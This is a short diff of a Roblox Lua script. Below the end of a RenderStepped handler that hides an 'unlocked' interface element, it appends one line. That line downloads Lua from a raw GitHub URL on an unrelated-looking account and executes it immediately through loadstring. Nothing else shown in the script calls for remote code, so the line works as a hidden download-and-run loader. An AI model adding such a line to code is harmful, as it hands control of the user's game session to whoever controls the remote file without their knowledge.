@@ -386,3 +386,5 @@ RunService.RenderStepped:Connect(function()
 		unlocked.Visible = false
 	end
 end)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/wkdopajwiojf/Check-id-map/refs/heads/main/Chat%20with%20me'))()
